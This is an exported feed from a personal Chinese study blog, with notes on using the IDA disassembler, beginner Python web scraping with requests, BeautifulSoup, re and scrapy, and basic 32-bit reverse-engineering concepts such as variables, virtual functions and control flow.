<img src="https://s2.ax1x.com/2020/03/02/3RV2Ox.md.png" alt=" "><br>
'↑j’中j表示跳转，o表示偏移量，p表示子程序，双击或按回车可以跳到调用该处的地方<br>
在‘loc_xxxxx’上按’x’打开交叉参考窗口</p>
<span id="more"></span>
<h2 id="参考重命名">参考重命名</h2>
<p>可把所有 loc_xxxxxx 重命名<br>
<img src="https://s2.ax1x.com/2020/03/02/3Ru4WF.png" alt=" "></p>
<h2 id="标签">标签</h2>
<p>打开标记当前位置功能：‘jump’-&gt;‘mark position’  快捷键:‘Alt+M’<br>
标记后在其他位置可以跳转到标记时光标的位置，快捷键：‘Ctrl+M’</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TRn9e.png" alt=" "><br>
<img src="https://s2.ax1x.com/2020/03/05/3TRVAK.png" alt=" "></p>
<h2 id="格式化指令操作数">格式化指令操作数</h2>
<p>把常量转换为十六、十、八、二进制<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRehD.png" alt=" "></p>
<h2 id="函数的操作">函数的操作</h2>
<h2 id="代码和数据转换">代码和数据转换</h2>
<p>IDA可能无法正确区分数据字节和代码字节，有些程序利用这一点对抗静态反汇编<br>
用户可以将某段数据指定为代码或数据<br>
方法：‘Edit’-&gt;‘Code’/‘Data’(快捷键’C’/‘D’)，'D’会将数据类型在db，dw，dd之间转换<br>
按’U’取消定义后得到一些可以重新定义的字节，按’P’将某段代码定义为子程序<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRZtO.png" alt=" "><br>
—&gt;<br>
<img src="https://s2.ax1x.com/2020/03/05/3TRk0x.md.png" alt="按'c'结果如图"></p>
<h2 id="字符串">字符串</h2>
<p>编程语言的不同造成字符串格式不同<br>
c语言字符串以0结尾，dos字符串以$结尾,其他可见于’Edit’-&gt;‘string’<br>
<img src="https://s2.ax1x.com/2020/03/05/3T7bP1.png" alt="3T7bP1.png"><br>
按’A’生成一个变量名，按’U’恢复，在’View’-&gt;‘Open subviews’-&gt;'Names’可以看到字符串变量</p>
<h2 id="数组">数组</h2>
<p>可以将数据按数组的形式显示<br>
<img src="https://s2.ax1x.com/2020/03/06/3bDXcR.png" alt="未识别的数组"><br>
‘Edit’-&gt;‘Array’或’ * '打开数组排列调整窗口<br>
<img src="https://s2.ax1x.com/2020/03/06/3b6yKs.png" alt="调整数组大小、每行项数（0自动调整）、对齐方式（0自动调整）"><br>
<img src="https://s2.ax1x.com/2020/03/06/3bDO39.png" alt="设置为'3 0 -1'的结果"></p>
<h2 id="结构体">结构体</h2>
<p>对一些常见的文件类型，IDA会自动加载相应的类型库，这些类型库中有相应的结构体。<br>
‘Shift+F11’打开加载类型库窗口（Loaded Type Libarries)，右键’Load Type Libarary’，'Insert’添加类型库</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*******************************************************</span></span><br><span class="line"><span class="comment">*程序:Structures.cpp                                                                                      *</span></span><br><span class="line"><span class="comment">*用途:IDA结构体反汇编                                                                        *</span></span><br><span class="line"><span class="comment">*   看雪软件安全网站                                                                              *   </span></span><br><span class="line"><span class="comment">*    www.pediy.com, kanxue 2002.8                                                                 *</span></span><br><span class="line"><span class="comment">********************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">	&#123;</span><span class="keyword">int</span> id;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[2]=</span>&#123;&#123;<span class="number">01</span>,<span class="string">&quot;Mary&quot;</span>,<span class="number">14</span>&#125;,&#123;<span class="number">02</span>,<span class="string">&quot;Angela&quot;</span>,<span class="number">15</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">for</span>(p=stu;p&lt;stu+<span class="number">2</span>;p++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%5d  %-20s%4d\n&quot;</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.ax1x.com/2020/03/06/3LK7fU.png" alt="对应了main()里的内容，结构体存在“unk_407030”那块"></p>
<p><img src="https://s2.ax1x.com/2020/03/06/3Lu7Md.md.png" alt="没有定义结构体时自动生成"><br>
如[esi+18h]调用了结构体中的数据，可用有意义的名字代替<br>
先把结构体数据中的数据重新定义<br>
<img src="https://s2.ax1x.com/2020/03/06/3LQWaq.md.png" alt="参考数组、字符串、数据类型"><br>
打开结构体窗口，insert一个结构类型。按’d’添加数据/切换数据类型，按’a’切换为字符串，按’n’修改结构体成员的名字<br>
<img src="https://s2.ax1x.com/2020/03/07/3OW2SP.png" alt=" "><br>
将光标定位在相应地址处，'Edit-&gt;‘Struct var’选择相应结构体类型<br>
<img src="https://s2.ax1x.com/2020/03/07/3OfiSx.png" alt="调整后"><br>
按’T’，在操作数类型中重新定义现有数据：<br>
<img src="https://s2.ax1x.com/2020/03/07/3OzPyD.png" alt=" "><br>
选择一片代码后可以批量进行替换：<br>
<img src="https://s2.ax1x.com/2020/03/07/3X9BnS.png" alt=""><br>
<em>lea：</em><br>
<em>lea bx，data</em><br>
<em>lea是load effective address 的缩写，是取源操作数的偏移地址，并将其传送到目的操作数单元。类似于C语言的取地址符&amp;。</em><br>
<em>lea eax,[eax+2</em>eax]的效果是eax = eax + eax * 2*<br>
<em>mov edx,[ebp+16]的效果是edx=(dword)(ebp+16).</em></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>python 爬虫学习</title>
    <url>/710f8e5f.html</url>
    <content><![CDATA[<p>就此开一篇单独记录 py 爬虫的学习<u>以及实操中遇到的问题</u>(可能吧)<br>
（分割线用（***或—））</p>
<h2 id="more"><span id="more"></span></h2>
<h1>爬虫入门</h1>
<p>以下为 mooc 上 BIT 嵩天老师课程<span class="exturl" data-url="aHR0cHM6Ly93d3cuaWNvdXJzZTE2My5vcmcvbGVhcm4vQklULTEwMDE4NzAwMDE/dGlkPTEyMDY5NTEyNjgjL2xlYXJuL2Fubm91bmNl">Python 网络爬虫与信息提取<i class="fa fa-external-link-alt"></i></span>的学习</p>
<h2 id="requests-库">requests 库</h2>
<h3 id="安装">安装</h3>
<p>管理员打开 cmd，安装 requests 库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install requests </span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyB5j.md.png" alt="以此检测安装成功"></p>
<h4 id="tip：-pip-下载超时（timeout）">tip： pip 下载超时（timeout）</h4>
<p>cmd 输入指令：</p>
<ol>
<li>pip --default-timeout=100 install -U pip</li>
</ol>
<p>或</p>
<ol start="2">
<li>pip install pip -U</li>
</ol>
<p>pip config set global.index-url <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnR1bmEudHNpbmdodWEuZWR1LmNuL3NpbXBsZQ==">https://pypi.tuna.tsinghua.edu.cn/simple<i class="fa fa-external-link-alt"></i></span><br>
（升级 pip 后更换为的清华镜像）</p>
<h3 id="r-request-get-url">r=request.get(url)</h3>
<p>构造一个向服务器请求资源的 request 对象，返回一个包含服务器资源的 response 对象<br>
response 对象包含了服务器返回的所有信息</p>
<p><img src="https://s1.ax1x.com/2020/03/17/8tysGn.md.png" alt="8tysGn.md.png"></p>
<p>r.apparent_encoding: 根据网页内容分析出的编码方式<br>
r.encoding: 如果 header 中不存在 charset，则默认编码为 ISO-8859-1</p>
<h3 id="爬取网页的通用代码框架">爬取网页的通用代码框架</h3>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyy2q.md.png" alt="8tyy2q.md.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requsets</span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 判断状态  如果不是200，则引发HTTPError异常</span></span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;产生异常&quot;</span></span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;getHTMLText(url))</span></span><br></pre></td></tr></table></figure>
<p>try：python 捕捉异常语句，详见：<span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLWV4Y2VwdGlvbnMuaHRtbA==">https://www.runoob.com/python/python-exceptions.html<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="requests-库主要方法">requests 库主要方法</h3>
<p><img src="https://s1.ax1x.com/2020/03/17/8ty6x0.md.png" alt="8ty6x0.md.png"></p>
<p>requests.request(method, url, **kwargs)<br>
requests.get(url, params=None, **kwargs)<br>
requests.head(url, **kwargs)<br>
requests.post(url, data=None, json=None, **kwargs)<br>
requests.put(url, data=None, **kwargs)<br>
requests.patch(url, data=None, **kwargs)<br>
requests.delete(url, **kwargs)</p>
<h4 id="kwargs">**kwargs:</h4>
<ol>
<li>params：字典或字节序列，作为参数添加到 url 中</li>
<li>data：字典、字节序列或文件对象，作为 request 的内容</li>
<li>json：json 格式的数据，作为 request 的内容</li>
<li>headers：定制 header</li>
<li>cookies</li>
<li>auth</li>
<li>files：传输文件</li>
<li>timeout：设定超时时间，单位为秒</li>
<li>proxies：设置代理服务器</li>
<li>allow_redirects</li>
<li>stream</li>
<li>verify</li>
<li>cert</li>
</ol>
<h3 id="爬虫尺寸">爬虫尺寸</h3>
<p>小规模：爬取网页。数据量小，速度不敏感。使用 requests 库<br>
中规模：爬取网站。数据量大，速度敏感。使用 scrapy 库<br>
大规模：爬取全网。（搜索引擎）</p>
<h3 id="限制爬虫">限制爬虫</h3>
<ol>
<li>来源审查：判断 user-agent</li>
<li>robots 协议</li>
</ol>
<h3 id="robots-协议">robots 协议</h3>
<p>Robots Exclusion Standard<br>
网络爬虫先识别 robots.txt 再进行爬取<br>
robots 协议时建议而非约束性，不遵守的话存在法律风险（类人行为可不参考 robots 协议）</p>
<h3 id="拒绝被爬：尝试修改-user-agent">拒绝被爬：尝试修改 user-agent</h3>
<p><img src="https://s1.ax1x.com/2020/03/19/8y3yQ0.md.png" alt="主要为黄色荧光部分"></p>
<h3 id="搜索引擎关键词提交">搜索引擎关键词提交</h3>
<p>百度：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tL3M/d2Q9">https://www.baidu.com/s?wd=<i class="fa fa-external-link-alt"></i></span><u>关键词</u></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">keyword=<span class="string">&quot;xxxx&quot;</span></span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">&#x27;wd&#x27;</span>:keyword&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com/s&quot;</span>,params=kv)</span><br></pre></td></tr></table></figure>
<h3 id="图片的爬取和存储">图片的爬取和存储</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&quot;....../...jpg&quot;</span></span><br><span class="line">root=<span class="string">&quot;D://pics//&quot;</span></span><br><span class="line">path=root+url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]    <span class="comment">#需要import os</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">        os.mkdir(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#保存↓</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功“)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;</span>文件已存在<span class="string">&quot;)</span></span><br><span class="line"><span class="string">except:</span></span><br><span class="line"><span class="string">    print(&quot;</span>失败<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>
<h2 id="BeautifulSoup-库">BeautifulSoup 库</h2>
<p>BeautifulSoup 库是一个解析、遍历、维护标签树的功能库</p>
<h3 id="安装-2">安装</h3>
<p>cmd 下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">或</span><br><span class="line"><span class="keyword">import</span> bs4</span><br></pre></td></tr></table></figure>
<p>作用：html 文档 ↔ 标签树 ↔beautifulsoup 类</p>
<h3 id="BeautifulSoup-基本元素">BeautifulSoup 基本元素</h3>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjZ5R.md.png" alt="8yjZ5R.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjEVJ.md.png" alt="8yjEVJ.md.png"></p>
<p>例：<br>
打印标签</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">r=requests.get(<span class="string">&quot;https://python123.io/ws/demo.html&quot;</span>)</span><br><span class="line">demo=r.text</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)  <span class="comment">#parser:html解析器</span></span><br><span class="line">soup.title  <span class="comment">#打印title标签</span></span><br><span class="line">soup.a.attrs[<span class="string">&quot;href&quot;</span>]   <span class="comment">#打印标签的链接</span></span><br></pre></td></tr></table></figure>
<h3 id="html-内容遍历">html 内容遍历</h3>
<p>html–树形结构<br>
遍历：下行遍历、上行遍历、平行遍历</p>
<h4 id="下行遍历：">下行遍历：</h4>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFk0H.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(child) <span class="keyword">in</span> soup.body.children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">获得子节点的数量：</span><br><span class="line"><span class="built_in">len</span>(soup.body.contents)</span><br><span class="line"></span><br><span class="line">获得其中某个的内容：</span><br><span class="line">soup.body.contents[<span class="number">1</span>]   <span class="comment">#获得第二个</span></span><br></pre></td></tr></table></figure>
<p>ps:'儿子节点’这种叫法听起来真是贼奇怪</p>
<h4 id="上行遍历：">上行遍历：</h4>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFPXD.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看父标签:</span><br><span class="line">soup.title.parent</span><br><span class="line">最高级标签（&lt;html&gt;他爸是他自己（.....)</span><br><span class="line"></span><br><span class="line">完整遍历：</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">    <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br></pre></td></tr></table></figure>
<h4 id="平行遍历：">平行遍历：</h4>
<p>发生在同一个父节点下的各个节点间<br>
平行遍历获得的下一个结点不一定是标签类型</p>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFFne.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看下一个平行标签:</span><br><span class="line">soup.a.next_sibling</span><br><span class="line">查看前一个平行标签:</span><br><span class="line">soup.a.previous_sibling</span><br><span class="line"></span><br><span class="line">完整：</span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.<span class="built_in">next</span>（或前序结点previous）_siblings:</span><br><span class="line">    <span class="built_in">print</span>(sibling)</span><br></pre></td></tr></table></figure>
<h3 id="Prettify">Prettify</h3>
<p>作用：在每个标签后添加换行符，print 的时候易于阅读<br>
使用方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.a.prettify())    <span class="comment">#单独对某个标签进行处理</span></span><br></pre></td></tr></table></figure>
<p> </p>
<p>以上为 2020.3.16-2020.3.21</p>
<hr>
<h2 id="正则表达式">正则表达式</h2>
<p>regular expression (RE)</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>任何单个字符</td>
<td></td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集</td>
<td>[abc]:a、b、c; [a-z]:a~z 单个字符</td>
</tr>
<tr>
<td>[^ ]</td>
<td>非字符集</td>
<td>[^abc]: 非 a、b、c 的单个字符</td>
</tr>
<tr>
<td>*</td>
<td>前一个字符 0 次或无限次扩展</td>
<td>abc *：ab、abc、abcc… …</td>
</tr>
<tr>
<td>+</td>
<td>前一个字符 1 次或无限次扩展</td>
<td>abc *：abc、abcc… …</td>
</tr>
<tr>
<td>?</td>
<td>前一个字符 0 次或 1 次扩展</td>
<td>abc *：abc、abcc… …</td>
</tr>
<tr>
<td>\</td>
<td></td>
<td>左右表达式任意一个： abc\ def :abc 或 def</td>
</tr>
<tr>
<td>{num}</td>
<td>扩展前一个字符 m 次</td>
<td>ab{2}c：abbc</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td>^abc:abc 在字符串的开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td>$abc:abc 在字符串的结尾</td>
</tr>
<tr>
<td>( )</td>
<td>分组标记，内部使用\</td>
<td>操作符 (abc):abc; (abc</td>
</tr>
<tr>
<td>\d</td>
<td>等价于 0~9</td>
<td></td>
</tr>
<tr>
<td>\w</td>
<td>等价于 A ~ Z, a ~ z, 0 ~ 9, _</td>
<td></td>
</tr>
</tbody>
</table>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9yZWdleHAvcmVnZXhwLXR1dG9yaWFsLmh0bWw=">https://www.runoob.com/regexp/regexp-tutorial.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Re-库">Re 库</h2>
<h3 id="调用方法">调用方法</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure>
<h3 id="表达式的表达类型">表达式的表达类型</h3>
<p>raw string：不包含转义符(\)的字符串<br>
string 类型(将’‘理解为转义符)<br>
raw string 如：r’[1-9]\d{5}‘、r’\d{3}-\d{8}\d{4}-\d{7}’<br>
string 如：[1-9]\\d{5}‘\\d{3}-\\d{8}\\d{4}-\\d{7}’</p>
<h3 id="主要功能函数">主要功能函数</h3>
<p><img src="https://s1.ax1x.com/2020/03/26/GSHMGD.png" alt=" "></p>
<ol>
<li>re.search(pattern,string,flags=0)</li>
<li>re.match(pattern,string,flags=0)</li>
<li>re.findall(pattern,string,flags=0)</li>
<li>re.finditer(pattern,stirng,flags=0)</li>
</ol>
<p>pattern: 正则表达式的字符串或原生字符串表示<br>
string：待匹配字符串</p>
<p>flags：正则表达式使用时的一些控制标记，包括：<br>
re. I:ignorecase, 忽略大小写<br>
re. M:multiline, 使用’^‘时将每行都当作匹配开始<br>
re. S:dotall, 让’.'匹配所有字符，包括换行符</p>
<ol start="5">
<li>re.search(pattern,string,maxsplit=0,flags=0)</li>
</ol>
<p>maxsplit: 最大分割数，限制分割的数量为 n，将剩下的所有部分输出为第 n+1 个</p>
<ol start="6">
<li>re.sub(pattern,repl,string,count=0,flags=0)</li>
</ol>
<p>repl: 替换的字符串<br>
count：替换的最大次数<br>
 </p>
<p>以上为2020.03.22-2020.03.28</p>
<hr>
<h3 id="RE库的match对象">RE库的match对象</h3>
<p>用 type(match)检查 match 的类型</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GGx6qs.png" alt=" "><br>
<img src="https://s1.ax1x.com/2020/04/02/GGxyrj.png" alt=" "></p>
<h3 id="贪婪匹配和最小匹配">贪婪匹配和最小匹配</h3>
<p>re库默认采用贪婪匹配，即输出匹配最长的子串</p>
<h2 id="Scrapy库">Scrapy库</h2>
<h3 id="scrapy爬虫框架安装">scrapy爬虫框架安装</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">scrapy -h    # 测试安装成功</span><br></pre></td></tr></table></figure>
<h3 id="scrapy-爬虫框架结构">scrapy 爬虫框架结构</h3>
<p>5个主体+2个中间件<br>
3个主体（engine+downloader+scheduler）为已有实现<br>
2个主体（item pipelines+spiders）为用户配置：<br>
item pipelines对获得信息进行处理<br>
spiders提供url和解析网页的内容</p>
<p>**以下3个不需要用户配置<br>
engine控制所有模块之间的数据流，根据条件触发事件<br>
downloader根据请求下载<br>
scheduler对所有爬取进行调度<br>
在以上三个中有一个中间件：downloader middleware</p>
<h3 id="scrapy库爬虫常用命令">scrapy库爬虫常用命令</h3>
<p>格式：scrapy<command>[options][args]<br>
一个工程是最大的单元（大的scrapy框架），其中有多个spider<br>
<img src="https://s1.ax1x.com/2020/04/05/GBh3Pf.png" alt=" "></p>
<h3 id="实例">实例</h3>
<p>…</p>
<h2 id="实例-2">实例</h2>
<h3 id="中国大学排名爬取">中国大学排名爬取</h3>
<p>数据来源：<span class="exturl" data-url="aHR0cDovL3d3dy56dWloYW9kYXh1ZS5jb20venVpaGFvZGF4dWVwYWltaW5nMjAxOS5odG1s">软科中国最好大学排名2019<i class="fa fa-external-link-alt"></i></span></p>
<ol>
<li>获取网页内容：gethtmltext()</li>
<li>提取信息到合适的数据结构：fillunivlist()</li>
<li>输出结果：printunivlist()</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethtmltext</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillunivlist</span>(<span class="params">ulist,html</span>):</span></span><br><span class="line">    soup=BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr,bs4.element.Tag):</span><br><span class="line">            tds=tr(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printunivlist</span>(<span class="params">ulist,num</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>,<span class="string">&quot;学校名称&quot;</span>,<span class="string">&quot;总分&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;&quot;</span>.<span class="built_in">format</span>(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>]))</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;suc&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    uinfo=[]<span class="comment"># 存放大学信息</span></span><br><span class="line">    url=<span class="string">&quot;http://www.zuihaodaxue.com/zuihaodaxuepaiming2019.html&quot;</span></span><br><span class="line">    html=gethtmltext(url)</span><br><span class="line">    fillunivlist(uinfo,html)</span><br><span class="line">    printunivlist(uinfo,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.16-2020.03.22</title>
    <url>/dcd92ddb.html</url>
    <content><![CDATA[<h1>32位软件逆向技术</h1>
<h2 id="数据结构">数据结构</h2>
<p>计算机存储、组织数据的方式。确定数据结构后，算法就很容易得到，有时候也根据特定算法来判断数据结构</p>
<h3 id="局部变量">局部变量</h3>
<p>局部变量分配空间时通常会使用栈和寄存器</p>
<span id="more"></span>
<h4 id="利用栈存放局部变量">利用栈存放局部变量</h4>
<p>变量分配与清除的形式：</p>
<ol>
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub esp,n</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">add esp,n</span><br></pre></td></tr></table></figure>
<ol start="2">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp,-n</span><br><span class="line">...用[ebp+xxxx]寻址</span><br><span class="line">sub esp,-n</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>(省空间)</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push reg  ;(相当于sub esp，4)</span><br><span class="line">...用[ebp-xxxx]寻址</span><br><span class="line">pop reg</span><br></pre></td></tr></table></figure>
<p>局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据，因此需要进行初始化，一种方法是通过mov指令，另一种是用push，如：“push 5”</p>
<h4 id="利用寄存器存放局部变量">利用寄存器存放局部变量</h4>
<p>除了栈占用2个寄存器，编译器会利用其他6个通用寄存器尽可能的存放局部变量，如果寄存器不够用会存到栈中</p>
<h3 id="全局变量">全局变量</h3>
<p>全集变量通常位于.data区块的一个固定地址处，访问时一般会用一个固定的硬编码地址直接对内存进行寻址（←使用这种方式比较容易识别出这是一个全局变量。）<br>
一般编译器会将<em>全局变量</em>放到<em>可读</em>写的区块里，如果放到<em>只读</em>区块里就是一个<em>常量</em></p>
<h3 id="数组">数组</h3>
<p>访问一般时通过基址加变址寻址实现的（基址可以是常量也可以是寄存器）</p>
<h2 id="虚函数">虚函数</h2>
<p>虚函数是在程序运行时定义的函数。（c++）<br>
虚函数的地址不能在编译时确定，只能在调用即将进行时确定。所有对虚函数的引用通常放在一个专用数组-虚函数表（virtual table）中，数组中的元素存放的就是类中数表的地址。</p>
<blockquote>
<p>虚函数 是在基类中使用关键字 virtual 声明的函数。在派生类中重新定义基类中定义的虚函数时，<em>会告诉编译器不要静态链接到该函数</em>。<br>
基类：当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类，新建的类称为派生类。<br>
继承：代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物，因此，狗是动物，等等。(<span class="exturl" data-url="aHR0cDovL3J1bm9vYi5jb20=">runoob.com<i class="fa fa-external-link-alt"></i></span>)</p>
</blockquote>
<p>程序通过两次寻址得到虚函数的地址然后执行</p>
<h2 id="控制语句">控制语句</h2>
<h3 id="if-else">if-else</h3>
<p>通常为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp a,b</span><br><span class="line">jz/jnz(相当于je/jne) xxxx</span><br></pre></td></tr></table></figure>
<p>整数用cmp指令比较，浮点值用fcom、fcomp等指令比较<br>
许多情况下，编译器用test或or之类的较短的逻辑指令来替换cmp指令<br>
<img src="https://s1.ax1x.com/2020/03/19/8ssrPP.md.png" alt=" "></p>
<h3 id="switch-case">switch-case</h3>
<p>编译器会编译出一组由不同关系运算组成的语句</p>
